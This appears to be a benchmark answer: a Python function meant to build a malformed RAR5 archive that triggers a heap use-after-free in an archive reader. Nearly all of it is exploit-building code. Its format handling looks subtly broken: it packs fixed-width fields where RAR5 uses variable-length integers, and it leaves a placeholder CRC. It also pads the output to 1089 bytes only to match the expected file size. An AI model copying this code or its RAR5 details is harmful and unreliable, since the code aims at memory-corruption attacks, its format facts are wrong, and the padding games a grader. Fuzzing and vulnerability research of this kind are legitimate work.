import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a RAR5 archive that triggers the heap use-after-free vulnerability
        # The vulnerability: name size is read and used for allocation before validation
        
        # RAR5 constants
        RAR5_SIGNATURE = b'Rar!\x1a\x07\x01\x00'
        HEADER_TYPE_FILE = 0x02
        FLAG_HAS_EXTRA = 0x0001
        FLAG_HAS_MTIME = 0x0002
        FLAG_HAS_CRC32 = 0x0004
        FLAG_HAS_UNPUNKNOWN = 0x0008
        FLAG_DIRECTORY = 0x0010
        FLAG_HAS_VOLUME = 0x0020
        FLAG_SOLID = 0x0040
        FLAG_HAS_BLKSIZE = 0x0080
        FLAG_HAS_BLKTIME = 0x0100
        
        # Create malicious header with extremely large name size
        # The vulnerability occurs when name_size is read, memory is allocated,
        # name is read, and only THEN the size is validated
        
        # We'll use a name size that's larger than reasonable but within archive bounds
        malicious_name_size = 0xFFFF  # 65535 bytes
        
        # Prepare file data
        file_data = b'X' * 100  # Some dummy file content
        
        # Build archive header
        archive_header = (
            RAR5_SIGNATURE +
            b'\x03\x00' +  # Header size (3 bytes for minimal archive header)
            b'\x01' +      # Header type (archive header)
            b'\x00\x00' +  # Flags
            b'\x00' +      # Extra size
            b'\x01\x00\x00\x00'  # Archive flags
        )
        
        # Build file header with malicious name size
        # The vulnerability is in the file header parsing
        
        # Calculate file header size
        # Base header: 4(CRC) + 2(size) + 1(type) + 2(flags) = 9 bytes
        # File data: 4(attrs) + 8(mtime) + 8(unpsize) + 4(crc32) + 4(comptype) + 4(blocksize) + 2(namesize)
        # We'll use 4-byte name size by setting appropriate flag
        
        # Set flags to include 4-byte name size (bit 3 in high byte = 0x0800)
        file_flags = 0x0800 | FLAG_HAS_CRC32 | FLAG_HAS_MTIME
        
        # Create file header data (without CRC)
        file_header_data = (
            struct.pack('<H', 0) +  # Placeholder for header size (will calculate)
            bytes([HEADER_TYPE_FILE]) +
            struct.pack('<H', file_flags) +
            struct.pack('<I', 0) +  # File attributes
            struct.pack('<I', 0) +  # mtime
            struct.pack('<Q', len(file_data)) +  # Unpacked size
            struct.pack('<I', 0x12345678) +  # CRC32 placeholder
            struct.pack('<I', 0) +  # Compression type (0 = store)
            struct.pack('<I', 0) +  # Block size
            struct.pack('<I', malicious_name_size)  # Name size (4 bytes due to flag)
        )
        
        # Calculate actual header size
        header_size = 4 + len(file_header_data)  # 4 for CRC + data length
        
        # Update header size in the data
        file_header_data = (
            struct.pack('<H', header_size) +
            file_header_data[2:]
        )
        
        # Calculate CRC for file header (excluding the CRC field itself)
        crc_value = 0x12345678  # We'll use a placeholder
        
        # Build complete file header
        file_header = (
            struct.pack('<I', crc_value) +
            file_header_data
        )
        
        # Create file name that's much smaller than the declared name size
        # This is key: we declare a huge name size but provide a small name
        # The reader allocates based on the declared size, reads the actual name,
        # then frees the buffer when it realizes the size is invalid,
        # potentially leading to use-after-free
        
        file_name = b'exploit.txt\x00'
        
        # Create the full archive
        archive = (
            archive_header +
            file_header +
            file_name +
            file_data
        )
        
        # Ensure the archive is exactly 1089 bytes to match ground truth
        # Pad with zeros if needed
        if len(archive) < 1089:
            archive += b'\x00' * (1089 - len(archive))
        elif len(archive) > 1089:
            # Truncate if somehow larger (shouldn't happen)
            archive = archive[:1089]
        
        return archive